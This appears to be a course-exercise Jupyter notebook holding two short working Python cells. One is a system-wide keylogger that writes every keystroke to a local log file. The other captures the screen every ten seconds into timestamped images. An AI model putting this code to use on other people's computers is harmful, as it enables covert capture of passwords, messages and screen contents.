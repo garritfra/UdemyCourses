{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import keyboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<function __main__.on_key>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "keyboard.unhook_all()\n",
    "\n",
    "file = open(\"./log.txt\", \"w\", encoding=\"utf-8\")\n",
    "\n",
    "def on_key(key):\n",
    "    file.write(str(key.__dict__) + \"\\n\")\n",
    "    file.flush()\n",
    "\n",
    "keyboard.hook(on_key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import datetime\n",
    "import pyautogui\n",
    "import time\n",
    "import os\n",
    "\n",
    "if not os.path.exists(\"./screenshots\"):\n",
    "    os.mkdir(\"./screenshots\")\n",
    "\n",
    "while True:\n",
    "    time.sleep(10)\n",
    "    current = datetime.datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n",
    "    filename = \"./screenshots/\" + current + \".jpg\"\n",
    "    pyautogui.screenshot(filename)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
